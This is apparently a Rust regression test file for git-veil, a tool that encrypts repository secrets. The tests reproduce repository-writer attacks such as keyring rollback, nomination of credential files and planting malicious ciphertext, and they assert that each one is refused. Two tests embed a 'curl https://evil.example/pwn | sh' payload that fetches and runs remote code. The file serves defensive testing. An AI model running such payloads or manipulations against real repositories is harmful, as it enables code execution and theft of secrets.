//! Attack reproduction tests and fix regressions.
//!
//! The tests below assert the refusals (exit codes 14, 71, 72) plus the
//! migration and normal-flow semantics of each fix.

use age::secrecy::ExposeSecret;
use git_veil::{
    cmd_add_file, cmd_add_key, cmd_allow, cmd_export_pin, cmd_hide, cmd_import, cmd_init,
    cmd_remove_file, cmd_remove_key, cmd_reveal, cmd_rotate, cmd_trust, cmd_verify_keys,
    exit_code_of, generate_signing_keypair, generate_x25519_private_key,
    x25519_public_key_encoding, TrackedFiles,
};

use std::fs;
use std::path::Path;

// Harness copied from tests/features.rs (integration tests are separate
// crates and cannot share helpers).

struct TempDir {
    path: std::path::PathBuf,
}

impl TempDir {
    fn new(label: &str) -> Self {
        let pid = std::process::id();
        let counter = COUNTER.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("git-veil-attack-{}-{}-{}", label, pid, counter));
        fs::create_dir_all(&dir).expect("create temp dir");
        Self { path: dir }
    }
    fn join(&self, rel: &str) -> std::path::PathBuf {
        self.path.join(rel)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

static COUNTER: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn init_git_repo(dir: &Path) {
    let args_list: &[&[&str]] = &[
        &["init", "--quiet"],
        &["config", "user.email", "owner@example.com"],
        &["config", "user.name", "Test Owner"],
        &["remote", "add", "origin", "git@github.com:owner/fara.git"],
    ];
    for args in args_list {
        let s = std::process::Command::new("git")
            .current_dir(dir)
            .args(*args)
            .status()
            .expect("git");
        assert!(s.success());
    }
}

const TEST_REPO_ID: &str = "fara+owner@github.com";

struct Fixture {
    repo: TempDir,
    key_store: TempDir,
}

impl Fixture {
    fn new(label: &str) -> Self {
        let repo = TempDir::new(label);
        let key_store = TempDir::new(&format!("{}-ks", label));
        init_git_repo(&repo.path);

        let identity = generate_x25519_private_key();
        let recipient = x25519_public_key_encoding(&identity);
        let (signing_key, verifying_hex) = generate_signing_keypair();

        fs::write(
            repo.join("owner.age"),
            format!("{}\n", identity.to_string().expose_secret()),
        )
        .unwrap();
        fs::write(
            key_store.join("signing-keys.txt"),
            format!("{}\n", hex::encode(signing_key.to_bytes())),
        )
        .unwrap();
        fs::write(
            key_store.join("owner.verifying"),
            format!("{}\n{}\n", verifying_hex, recipient),
        )
        .unwrap();

        cmd_init(
            &repo.path,
            &key_store.join("owner.verifying"),
            "origin",
            &key_store.path,
            false,
            false,
        )
        .expect("init copies the owner key in and pins");
        cmd_import(&repo.path, &["owner.age".to_string()], &key_store.path).expect("import");

        Self { repo, key_store }
    }

    /// Tells a collaborator into the keyring. Returns the collaborator's
    /// X25519 private key so the test can later prove what it can still
    /// decrypt.
    fn add_collab(&self, email: &str) -> age::x25519::Identity {
        let id = generate_x25519_private_key();
        let r = x25519_public_key_encoding(&id);
        cmd_add_key(
            &self.repo.path,
            email,
            &r,
            "origin",
            &self.key_store.path,
            None,
        )
        .expect("add-key");
        id
    }

    fn add_file(&self, name: &str, content: &[u8]) {
        let p = self.repo.join(name);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, content).unwrap();
        cmd_add_file(
            &self.repo.path,
            vec![name.to_string()],
            "origin",
            &self.key_store.path,
        )
        .expect("add-file");
    }

    fn hide(&self) {
        cmd_hide(
            &self.repo.path,
            "origin",
            &self.key_store.path,
            true,
            self.tracked_names(),
        )
        .expect("hide");
    }

    /// The tracked file names, as the required-form hide and reveal calls
    /// name them. Tests that act on the whole tracked set name the whole
    /// tracked set explicitly: the bare form is gone (issue 50).
    fn tracked_names(&self) -> Vec<String> {
        TrackedFiles::load(&self.repo.path.join(".git-veil/tracked.json"))
            .unwrap()
            .files
            .iter()
            .map(|p| p.to_string_lossy().to_string())
            .collect()
    }

    /// Stages everything the way the owner's commit would, so the git index
    /// (which the orphan gate reads) reflects the
    /// committed state. The plaintext is gitignored, so this stages only
    /// ciphertext and .git-veil state.
    fn stage_all(&self) {
        let s = std::process::Command::new("git")
            .current_dir(&self.repo.path)
            .args(["add", "-A"])
            .status()
            .expect("git add");
        assert!(s.success());
    }

    /// Commits the staged state.
    fn commit_all(&self, message: &str) {
        self.stage_all();
        let s = std::process::Command::new("git")
            .current_dir(&self.repo.path)
            .args(["commit", "--quiet", "-m", message])
            .status()
            .expect("git commit");
        assert!(s.success());
    }
}

// ---------------------------------------------------------------------------
// Regression: a rolled-back keyring is refused by the freshness baseline
// (exit 14).
//
// add-key/remove-key bump a monotonic counter inside the signed payload,
// and every machine records the highest version it has accepted (beside the
// pin, outside the repo).
// ---------------------------------------------------------------------------

#[test]
fn fix_keyring_rollback_refused_by_freshness_baseline() {
    let f = Fixture::new("keyring-rollback");

    let carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=old\n");
    f.hide();

    let keyring_path = f.repo.join(".git-veil/keyring");
    // Snapshot v1 (carol present, validly signed by the pinned owner key).
    let keyring_v1 = fs::read_to_string(&keyring_path).unwrap();
    assert!(keyring_v1.contains("carol@example.com"));

    // Owner revokes carol: keyring v2 (empty, re-signed) verifies fine.
    cmd_remove_key(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("remove-key");
    let keyring_v2 = fs::read_to_string(&keyring_path).unwrap();
    assert!(!keyring_v2.contains("carol@example.com"));
    cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect("v2 (empty, signed) verifies");

    // Attack: a repo writer restores the old keyring file content
    // (equivalent to `git revert` of the remove-key commit).
    fs::write(&keyring_path, &keyring_v1).unwrap();

    // Verification refuses the rolled-back keyring with exit 14. The
    // signature is valid but the version regressed below the baseline.
    let err = cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("rolled-back keyring must be refused");
    assert_eq!(
        exit_code_of(&err),
        14,
        "keyring rollback must exit with the documented code 14"
    );

    // And hide (like every gated command) refuses on the same check.
    let err = cmd_hide(
        &f.repo.path,
        "origin",
        &f.key_store.path,
        true,
        f.tracked_names(),
    )
    .expect_err("hide must refuse on the rolled-back keyring");
    assert_eq!(exit_code_of(&err), 14);

    // The stale v1 ciphertext on disk is untouched. Carol still decrypts
    // what she always could, but no new secret can flow to her. Hide
    // refused.

    // Recovery: a genuinely intended rollback is re-anchored with a fresh
    // init, which resets the freshness baseline along with the pin.
    fs::remove_dir_all(f.repo.join(".git-veil")).unwrap();
    cmd_init(
        &f.repo.path,
        &f.key_store.join("owner.verifying"),
        "origin",
        &f.key_store.path,
        false,
        false,
    )
    .expect("re-init re-anchors and resets the baseline");
    cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect("verify succeeds after the re-init reset the baseline");
    let _ = carol;
}

// ---------------------------------------------------------------------------
// Regression: keyring version migration semantics
// ---------------------------------------------------------------------------

/// Re-signs `keyring_text`'s keyring block with the fixture's owner key,
/// returning a full keyring file (block + fresh signature).
fn resigned(keyring_text: &str, version: Option<u64>, f: &Fixture) -> String {
    let mut kr = git_veil::Keyring::parse(keyring_text).unwrap();
    kr.version = version;
    kr.signature = None;
    let content = git_veil::extract_content_to_verify_from_keyring(&kr.serialize()).unwrap();
    let seed = fs::read_to_string(f.key_store.join("signing-keys.txt")).unwrap();
    let signing_key = git_veil::parse_signing_key(seed.trim()).unwrap();
    format!(
        "{}{}",
        kr.serialize(),
        git_veil::create_signature_block(&content, &signing_key).unwrap()
    )
}

#[test]
fn fix_versionless_keyring_is_a_migration_state_not_a_rollback() {
    let f = Fixture::new("migration-forward");
    // add-key writes version 1 and hide's verify records baseline 1.
    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=x\n");
    f.hide();
    let keyring_path = f.repo.join(".git-veil/keyring");

    // A versionless keyring counts as version 0. Once a versioned baseline
    // exists it is a rollback, so it is refused.
    let versionless = resigned(&fs::read_to_string(&keyring_path).unwrap(), None, &f);
    fs::write(&keyring_path, &versionless).unwrap();
    let err = cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("versionless keyring must be refused once a versioned baseline exists");
    assert_eq!(exit_code_of(&err), 14);

    // On a machine with no baseline (the real migration case), a
    // versionless signed keyring is accepted and establishes baseline 0.
    let f2 = Fixture::new("migration-fresh");
    let _carol2 = f2.add_collab("carol@example.com");
    let versionless2 = resigned(
        &fs::read_to_string(f2.repo.join(".git-veil/keyring")).unwrap(),
        None,
        &f2,
    );
    // The baseline is still 0: add-key's verify saw the empty unsigned keyring
    // (observed 0, baseline 0), and no gated command ran since the v1 write.
    // A versionless keyring is not a regression.
    fs::write(f2.repo.join(".git-veil/keyring"), &versionless2).unwrap();
    cmd_verify_keys(&f2.repo.path, "origin", &f2.key_store.path)
        .expect("versionless keyring accepted while the baseline is still 0");

    // The next versioned keyring (v1) is then free to establish baseline 1,
    // after which the versionless state is refused as a rollback.
    let versioned = resigned(&versionless2, Some(1), &f2);
    fs::write(f2.repo.join(".git-veil/keyring"), &versioned).unwrap();
    cmd_verify_keys(&f2.repo.path, "origin", &f2.key_store.path)
        .expect("versioned keyring accepted, baseline advances to 1");
    fs::write(f2.repo.join(".git-veil/keyring"), &versionless2).unwrap();
    let err = cmd_verify_keys(&f2.repo.path, "origin", &f2.key_store.path)
        .expect_err("versionless keyring refused now that the baseline is 1");
    assert_eq!(exit_code_of(&err), 14);
}

#[test]
fn fix_malformed_version_lines_are_parse_failures() {
    use git_veil::{Keyring, BEGIN_MARKER, END_MARKER};

    for bad in ["version:abc", "version:", "version:-1", "version:1.0"] {
        let text = format!("{}\n{}\n{}\n", BEGIN_MARKER, bad, END_MARKER);
        let err = Keyring::parse(&text).expect_err(bad);
        assert_eq!(
            exit_code_of(&err),
            62,
            "malformed version line must be a parse failure"
        );
    }

    // A duplicate version line is refused, never silently accepted.
    let dup = format!("{}\nversion:1\nversion:2\n{}\n", BEGIN_MARKER, END_MARKER);
    let err = Keyring::parse(&dup).expect_err("duplicate version");
    assert_eq!(exit_code_of(&err), 62);
}

// ---------------------------------------------------------------------------
// Regression: nominated paths are refused at hide time (exit 72).
//
// tracked.json is committed and unsigned, so a repo writer can nominate a
// path. Hide refuses to first-encrypt a tracked path that has a plaintext
// on disk, no committed ciphertext in the index, and no allowance on this
// machine. The allowance record lives in the key store, keyed to the trust
// pin and the principal. See "Allowance" in docs/design.md.
// ---------------------------------------------------------------------------

#[test]
fn fix_nominated_path_refused_at_hide() {
    let f = Fixture::new("nominated-path");

    // The attacker is a legitimate keyring member (repo write access).
    let _mallory = f.add_collab("mallory@example.com");

    // Victim's private file. It is gitignored and never passed to
    // `git-veil add`.
    let secret_plaintext = b"AWS_SECRET_ACCESS_KEY=AKIA...\n";
    fs::write(f.repo.join("prod-credentials"), secret_plaintext).unwrap();
    fs::write(f.repo.join(".gitignore"), "prod-credentials\n").unwrap();

    // Attack: the repo writer edits the committed tracked.json directly.
    // This file is not covered by the keyring signature.
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"prod-credentials\"\n  ]\n}",
    )
    .unwrap();

    // Hide refuses with exit 72. No ciphertext is created and nothing is
    // exfiltrated.
    let err = cmd_hide(
        &f.repo.path,
        "origin",
        &f.key_store.path,
        true,
        f.tracked_names(),
    )
    .expect_err("hide must refuse a nominated path with no allowance and no ciphertext");
    assert_eq!(
        exit_code_of(&err),
        72,
        "nomination must exit with the documented code 72"
    );
    // The tracked path is committed in tracked.json. It is a public
    // repository fact, so the refusal names it.
    assert!(
        err.to_string().contains("prod-credentials"),
        "exit 72 names the offending tracked path: {err}"
    );
    assert!(
        !f.repo.join("prod-credentials.secret").exists(),
        "no ciphertext may be written for a nominated path"
    );

    // Remedy. The tracking is wanted, so the victim allows the path
    // deliberately. This records the allowance on the machine, and hide
    // then proceeds.
    cmd_allow(
        &f.repo.path,
        vec!["prod-credentials".to_string()],
        "origin",
        &f.key_store.path,
    )
    .expect("victim allows the path deliberately");
    cmd_hide(
        &f.repo.path,
        "origin",
        &f.key_store.path,
        true,
        f.tracked_names(),
    )
    .expect("hide after the allowance");
}

#[test]
fn fix_committed_ciphertext_needs_no_allowance() {
    // Rotation flow. The ciphertext is committed, so the path is
    // established: any machine with the pin re-encrypts it without a local
    // allowance. This is what keeps rotation working on a fresh clone.
    let f = Fixture::new("established-ciphertext");

    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=v1\n");
    f.hide();
    f.commit_all("owner commits manifest and ciphertext together");

    // Simulate another machine: a new key store with no allowance records.
    // The pin travels by export-pin, the way a fresh clone establishes
    // trust.
    let fresh_store = TempDir::new("established-fresh-ks");
    let pin_file = fresh_store.join("fara.pin");
    cmd_export_pin(
        &f.repo.path,
        TEST_REPO_ID,
        &pin_file,
        "origin",
        &f.key_store.path,
    )
    .expect("export-pin");
    cmd_trust(&f.repo.path, &pin_file, "origin", &fresh_store.path, false).expect("import");

    // The ciphertext is in the git index, so hide proceeds with no
    // allowance on this machine.
    cmd_hide(
        &f.repo.path,
        "origin",
        &fresh_store.path,
        true,
        f.tracked_names(),
    )
    .expect("an established ciphertext re-encrypts without a local allowance");
}

#[test]
fn fix_add_implies_allow() {
    // The manifest nomination is the user's standing instruction: add on
    // this machine records the allowance, and hide never refuses the path
    // the user themselves added here.
    use git_veil::{AllowanceStore, TrustPinStore};
    let f = Fixture::new("add-implies-allow");
    let _carol = f.add_collab("carol@example.com");

    f.add_file("secrets.env", b"TOKEN=v1\n");

    // The allowance record exists on this machine, keyed to the pin and
    // the owner's principal.
    let pin = TrustPinStore::read_pin(&f.key_store.path, TEST_REPO_ID)
        .unwrap()
        .expect("the fixture established a pin");
    assert!(AllowanceStore::contains(
        &f.key_store.path,
        TEST_REPO_ID,
        &pin,
        "owner@example.com",
        Path::new("secrets.env")
    ));

    // And hide does not refuse: no exit 72 for the path added here.
    f.hide();
}

// ---------------------------------------------------------------------------
// Regression: the allowance store is keyed per pin and principal
//
// One record file per (repo id, pin fingerprint, principal) triple, one
// repo-relative path per line. Purge removes a principal's record so a
// revoked collaborator leaves no ambient consent.
// ---------------------------------------------------------------------------

#[test]
fn allowance_store_is_keyed_per_pin_and_principal() {
    use git_veil::{allowance_record_key, AllowanceStore, TrustPinStore};

    let ks = TempDir::new("allowance-store");
    let rel = Path::new("secrets.env");

    AllowanceStore::record(&ks.path, "repo-a", "PIN1", "alice@example.com", rel).unwrap();
    assert!(AllowanceStore::contains(
        &ks.path,
        "repo-a",
        "PIN1",
        "alice@example.com",
        rel
    ));
    // A different principal, a different pin: both key their own records.
    assert!(!AllowanceStore::contains(
        &ks.path,
        "repo-a",
        "PIN1",
        "bob@example.com",
        rel
    ));
    assert!(!AllowanceStore::contains(
        &ks.path,
        "repo-a",
        "PIN2",
        "alice@example.com",
        rel
    ));
    // The pin fingerprint is canonicalised to lowercase before hashing.
    assert!(AllowanceStore::contains(
        &ks.path,
        "repo-a",
        "pin1",
        "alice@example.com",
        rel
    ));
    // Repositories are isolated.
    assert!(!AllowanceStore::contains(
        &ks.path,
        "repo-b",
        "PIN1",
        "alice@example.com",
        rel
    ));

    // Record shape: one repo-relative path per line, at the documented
    // path under the key store.
    AllowanceStore::record(
        &ks.path,
        "repo-a",
        "PIN1",
        "alice@example.com",
        Path::new("other.env"),
    )
    .unwrap();
    let record = ks
        .path
        .join("allowances")
        .join(TrustPinStore::sanitize_repo_id("repo-a"))
        .join(allowance_record_key("pin1", "alice@example.com"));
    let content = fs::read_to_string(&record).unwrap();
    assert_eq!(
        content.lines().collect::<Vec<_>>(),
        vec!["secrets.env", "other.env"],
        "one repo-relative path per line"
    );

    // Purge removes the principal's record and reports honestly.
    assert!(AllowanceStore::purge(&ks.path, "repo-a", "PIN1", "alice@example.com").unwrap());
    assert!(!AllowanceStore::contains(
        &ks.path,
        "repo-a",
        "PIN1",
        "alice@example.com",
        rel
    ));
    assert!(!AllowanceStore::purge(&ks.path, "repo-a", "PIN1", "alice@example.com").unwrap());
}

#[test]
fn fix_remove_key_purges_the_removed_principal_allowance() {
    let f = Fixture::new("purge-allowance");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=x\n");
    f.hide();

    // Simulate a machine whose key store also holds carol's consent
    // (carol worked here under her principal). Her record is keyed to the
    // same pin this repo is pinned with.
    use git_veil::{AllowanceStore, TrustPinStore};
    let pin = TrustPinStore::read_pin(&f.key_store.path, TEST_REPO_ID)
        .unwrap()
        .expect("the fixture established a pin");
    let rel = Path::new("secrets.env");
    AllowanceStore::record(
        &f.key_store.path,
        TEST_REPO_ID,
        &pin,
        "carol@example.com",
        rel,
    )
    .unwrap();
    assert!(AllowanceStore::contains(
        &f.key_store.path,
        TEST_REPO_ID,
        &pin,
        "carol@example.com",
        rel
    ));

    // The owner revokes carol. The purge takes her allowance record with
    // the keyring entry, on this machine's key store.
    cmd_remove_key(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("remove-key");
    assert!(
        !AllowanceStore::contains(
            &f.key_store.path,
            TEST_REPO_ID,
            &pin,
            "carol@example.com",
            rel
        ),
        "the removed principal must leave no ambient consent"
    );

    // The owner's own allowance is untouched.
    assert!(AllowanceStore::contains(
        &f.key_store.path,
        TEST_REPO_ID,
        &pin,
        "owner@example.com",
        rel
    ));
}

// ---------------------------------------------------------------------------
// Regression: `remove` deletes the sibling ciphertext by default
// ---------------------------------------------------------------------------

#[test]
fn fix_remove_deletes_ciphertext_by_default() {
    let f = Fixture::new("remove-default");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("api.key", b"API_KEY=x\n");
    f.hide();
    assert!(f.repo.join("api.key.secret").exists());

    cmd_remove_file(&f.repo.path, vec!["api.key".to_string()], false).expect("remove-file");
    assert!(
        !f.repo.join("api.key.secret").exists(),
        "remove must delete the sibling ciphertext by default"
    );
    assert!(
        !TrackedFiles::load(&f.repo.join(".git-veil/tracked.json"))
            .unwrap()
            .files
            .contains(&"api.key".into()),
        "remove must untrack the file"
    );
}

#[test]
fn fix_remove_keep_ciphertext_leaves_the_orphan_in_place() {
    let f = Fixture::new("remove-keep");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("api.key", b"API_KEY=x\n");
    f.hide();
    f.stage_all();

    cmd_remove_file(&f.repo.path, vec!["api.key".to_string()], true).expect("remove-file");
    assert!(
        f.repo.join("api.key.secret").exists(),
        "--keep-ciphertext leaves the ciphertext in place"
    );

    // The kept-back ciphertext is an untracked orphan. A scoped hide never
    // rotates it: hide acts only on the files it names (issue 50), so the
    // name is refused. Rotate owns the whole-manifest
    // pass and the orphan gate that guards it.
    let err = cmd_hide(
        &f.repo.path,
        "origin",
        &f.key_store.path,
        true,
        vec!["api.key".to_string()],
    )
    .expect_err("hide refuses a name outside the manifest");
    assert_eq!(exit_code_of(&err), 71);
}

// ---------------------------------------------------------------------------
// Regression: rotate refuses a committed-but-untracked ciphertext (exit 42)
//
// The de-tracking attack: a repo writer untracks a path while its
// ciphertext stays committed. Rotate rotates the whole manifest, so
// it is exactly the pass that would silently skip the orphan and leave it
// decryptable by a removed collaborator. The orphan gate refuses the pass.
// ---------------------------------------------------------------------------

#[test]
fn fix_rotate_refuses_a_committed_untracked_ciphertext() {
    let f = Fixture::new("ceremony-orphan");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("api.key", b"API_KEY=x\n");
    f.hide();
    f.stage_all();

    // De-track the path while its ciphertext stays committed (the
    // --keep-ciphertext shape, as a repo writer or a careless owner would
    // produce), then stage the manifest change so the index reflects it.
    cmd_remove_file(&f.repo.path, vec!["api.key".to_string()], true).expect("remove-file");
    f.stage_all();

    // The stamp is due (add-key stamped the ring change; the scoped hide never
    // consumed it), so the refusal is the orphan gate, not the stamp gate.
    let err = cmd_rotate(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("the pass must refuse a committed orphan");
    assert_eq!(
        exit_code_of(&err),
        42,
        "the orphan gate refuses the whole-manifest pass"
    );
    let message = format!("{:#}", err);
    assert!(
        message.contains("api.key.secret"),
        "the refusal names the orphan: {message}"
    );
    assert!(
        f.repo.join("api.key.secret").exists(),
        "nothing is rotated on refusal"
    );
}

// ---------------------------------------------------------------------------
// Regression: reveal refuses a tracked-in-git plaintext (exit 43)
//
// A git-tracked plaintext is repository content, not a secret.
// Reveal refuses to overwrite it.
// ---------------------------------------------------------------------------

#[test]
fn fix_reveal_refuses_tracked_in_git_plaintext() {
    let f = Fixture::new("f1-reveal-clobber");

    // The victim: a legitimate collaborator with a key in their key store.
    // This store simulates the victim's machine.
    let victim = generate_x25519_private_key();
    let victim_recipient = x25519_public_key_encoding(&victim);
    cmd_add_key(
        &f.repo.path,
        "victim@example.com",
        &victim_recipient,
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("add-key victim");
    fs::write(
        f.repo.join("victim.age"),
        format!("{}\n", victim.to_string().expose_secret()),
    )
    .unwrap();
    cmd_import(&f.repo.path, &["victim.age".to_string()], &f.key_store.path)
        .expect("import victim");

    // A normal repo source file, tracked in git. It is never a secret and
    // never passed to git-veil add. The victim would never hide this.
    fs::create_dir_all(f.repo.join("ci")).unwrap();
    let legitimate = "#!/bin/sh\necho legitimate\n";
    fs::write(f.repo.join("ci/deploy.sh"), legitimate).unwrap();

    // Attack: a repo writer nominates the source file in tracked.json and
    // commits a payload ciphertext encrypted to the ring's public keys. No
    // signing key is needed. Only the keyring signature must verify, and
    // the attacker leaves the keyring untouched.
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"ci/deploy.sh\"\n  ]\n}",
    )
    .unwrap();

    let keyring_text = fs::read_to_string(f.repo.join(".git-veil/keyring")).unwrap();
    let ring = git_veil::Keyring::parse(&keyring_text).unwrap();
    let recipients: Vec<_> = ring
        .entries
        .iter()
        .map(|e| git_veil::parse_x25519_public_key(&e.public_key).unwrap())
        .collect();
    let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
    let evil_ct = git_veil::encrypt_to_x25519_public_keys(payload, &recipients).unwrap();
    fs::write(f.repo.join("ci/deploy.sh.secret"), evil_ct).unwrap();
    f.stage_all(); // attacker commits tracked.json + the evil ciphertext

    // Reveal refuses with exit 43. The tracked-in-git source file is not
    // overwritten.
    let err = cmd_reveal(
        &f.repo.path,
        "victim@example.com",
        "origin",
        &f.key_store.path,
        f.tracked_names(),
    )
    .expect_err("reveal must refuse a git-tracked plaintext");
    assert_eq!(
        exit_code_of(&err),
        43,
        "tracked-plaintext clobber must exit with the documented code 43"
    );
    assert_eq!(
        fs::read_to_string(f.repo.join("ci/deploy.sh")).unwrap(),
        legitimate,
        "the source file must be untouched"
    );

    // And the single-file reveal form refuses the same way.
    let err = cmd_reveal(
        &f.repo.path,
        "victim@example.com",
        "origin",
        &f.key_store.path,
        vec!["ci/deploy.sh".to_string()],
    )
    .expect_err("single-file reveal must refuse a git-tracked plaintext");
    assert_eq!(exit_code_of(&err), 43);
}

#[test]
fn fix_reveal_still_works_for_gitignored_plaintexts() {
    // The normal flow. The plaintext is gitignored and never in the
    // index, and the committed ciphertext reveals fine. The exit-43 gate
    // must not disturb legitimate reveal.
    let f = Fixture::new("reveal-normal");
    let _carol = f.add_collab("carol@example.com");
    // The owner must be in the keyring too for the reveal below. Their
    // X25519 private key is in the key store. The public key is
    // owner.verifying line 2.
    let owner_verifying = fs::read_to_string(f.repo.join(".git-veil/owner.verifying")).unwrap();
    let owner_recipient = owner_verifying.lines().nth(1).unwrap().trim();
    cmd_add_key(
        &f.repo.path,
        "owner@example.com",
        owner_recipient,
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("add-key owner");
    let secret = b"TOKEN=v1\n";
    f.add_file("secrets.env", secret);
    f.hide();
    f.stage_all();

    fs::remove_file(f.repo.join("secrets.env")).unwrap(); // hidden state
    cmd_reveal(
        &f.repo.path,
        "owner@example.com",
        "origin",
        &f.key_store.path,
        f.tracked_names(),
    )
    .expect("reveal of a gitignored tracked plaintext must work");
    assert_eq!(fs::read(f.repo.join("secrets.env")).unwrap(), secret);

    cmd_reveal(
        &f.repo.path,
        "owner@example.com",
        "origin",
        &f.key_store.path,
        vec!["secrets.env".to_string()],
    )
    .expect("repeat reveal of a gitignored tracked plaintext must work");
}

// ---------------------------------------------------------------------------
// Repros - red-team pass 2
//
// These tests document the three confirmed findings and assert the
// refusals the fixes introduced.
// ---------------------------------------------------------------------------

/// An unsigned zero-entry keyring is unauthenticated repo content. It
/// is refused outright when a baseline exists, because a rollback to
/// "no collaborators" must fail closed, and it never moves the
/// baseline, so the owner's restore of the real ring un-bricks the
/// machine.
#[test]
fn fix_baseline_not_poisoned_by_unsigned_empty_keyring() {
    let f = Fixture::new("poison-baseline");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=x\n");
    f.hide();
    f.stage_all();
    let keyring_path = f.repo.join(".git-veil/keyring");
    let real_ring = fs::read_to_string(&keyring_path).unwrap();

    // Attack: unsigned, zero-entry ring with a poisoned version line.
    fs::write(
        &keyring_path,
        format!(
            "{}\nversion:18446744073709551615\n{}\n",
            git_veil::BEGIN_MARKER,
            git_veil::END_MARKER
        ),
    )
    .unwrap();

    // Refused with exit 14. It parses as a rollback to no collaborators,
    // and its version line is unauthenticated so it cannot move the
    // baseline.
    let err = cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("unsigned ring must be refused when a baseline exists");
    assert_eq!(exit_code_of(&err), 14);

    // Owner restores the real ring. The machine is not bricked. The
    // baseline was never advanced by the unsigned ring.
    fs::write(&keyring_path, &real_ring).unwrap();
    cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect("real ring verifies again: no baseline poisoning");

    // On a machine with no baseline (fresh init), an unsigned empty ring
    // is still the legitimate fresh-init state. It is accepted, and the
    // baseline is not written. Only signed rings may advance it.
    let f2 = Fixture::new("poison-fresh");
    let keyring_path2 = f2.repo.join(".git-veil/keyring");
    let _carol2 = f2.add_collab("carol@example.com");
    let clean_ring = fs::read_to_string(&keyring_path2).unwrap();

    fs::write(
        &keyring_path2,
        format!(
            "{}\nversion:18446744073709551615\n{}\n",
            git_veil::BEGIN_MARKER,
            git_veil::END_MARKER
        ),
    )
    .unwrap();
    cmd_verify_keys(&f2.repo.path, "origin", &f2.key_store.path)
        .expect("fresh-init unsigned empty ring accepted on a baseline-less machine");
    fs::write(&keyring_path2, &clean_ring).unwrap();
    cmd_verify_keys(&f2.repo.path, "origin", &f2.key_store.path).expect(
        "clean ring verifies on the fresh machine: no baseline was written by the unsigned ring",
    );
}

/// A case-variant path spelling cannot evade the exit-43 gate. The
/// fallback refuses any case-insensitive index match, so the tracked
/// source file is untouched on case-insensitive filesystems.
#[test]
fn fix_case_variant_refused_by_tracked_plaintext_gate() {
    let f = Fixture::new("case-variant");
    let victim = generate_x25519_private_key();
    let victim_recipient = x25519_public_key_encoding(&victim);
    cmd_add_key(
        &f.repo.path,
        "victim@example.com",
        &victim_recipient,
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("add-key victim");
    fs::write(
        f.repo.join("victim.age"),
        format!("{}\n", victim.to_string().expose_secret()),
    )
    .unwrap();
    cmd_import(&f.repo.path, &["victim.age".to_string()], &f.key_store.path).expect("import");

    // Attacker commits tracked source file Build.sh + manifest entry spelled
    // BUILD.SH + payload ciphertext BUILD.SH.secret.
    fs::create_dir_all(f.repo.join("ci")).unwrap();
    let legitimate = "#!/bin/sh\necho legitimate\n";
    fs::write(f.repo.join("ci/Build.sh"), legitimate).unwrap();
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"ci/BUILD.SH\"\n  ]\n}",
    )
    .unwrap();
    let ring =
        git_veil::Keyring::parse(&fs::read_to_string(f.repo.join(".git-veil/keyring")).unwrap())
            .unwrap();
    let recipients: Vec<_> = ring
        .entries
        .iter()
        .map(|e| git_veil::parse_x25519_public_key(&e.public_key).unwrap())
        .collect();
    let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
    fs::write(
        f.repo.join("ci/BUILD.SH.secret"),
        git_veil::encrypt_to_x25519_public_keys(payload, &recipients).unwrap(),
    )
    .unwrap();
    f.stage_all();

    // Reveal refuses with exit 43. The case-insensitive fallback sees
    // the case-variant index entry.
    let err = cmd_reveal(
        &f.repo.path,
        "victim@example.com",
        "origin",
        &f.key_store.path,
        f.tracked_names(),
    )
    .expect_err("exit-43 gate must refuse the case-variant spelling");
    assert_eq!(exit_code_of(&err), 43);
    assert_eq!(
        fs::read_to_string(f.repo.join("ci/Build.sh")).unwrap(),
        legitimate,
        "the tracked source file must be untouched on any filesystem"
    );
}

/// Hide does not false-positive on core.quotePath-quoted unicode names,
/// because the index is read verbatim, nor on an attacker-committed file
/// named exactly `.secret`. That file is warned about and ignored.
#[test]
fn fix_hide_survives_quoting_and_dot_secret_in_index() {
    let f = Fixture::new("orphan-brick");
    let _carol = f.add_collab("carol@example.com");

    // (a) Honest unicode + space name, committed the normal way.
    let unicode_name = "süb dir/café-sércret.env";
    f.add_file(unicode_name, b"VALUE=1\n");
    f.hide();
    f.stage_all();

    // (b) Attacker-committed junk file named exactly `.secret`.
    fs::write(f.repo.join(".secret"), b"junk\n").unwrap();
    f.stage_all();

    // Hide proceeds. The unicode ciphertext maps back to its tracked
    // path, and the stemless junk file is warned about, not fatal.
    cmd_hide(
        &f.repo.path,
        "origin",
        &f.key_store.path,
        true,
        f.tracked_names(),
    )
    .expect("hide must not be bricked");
    assert!(
        f.repo.join(unicode_name).exists(),
        "--keep-plaintext path: the unicode plaintext is intact"
    );
}

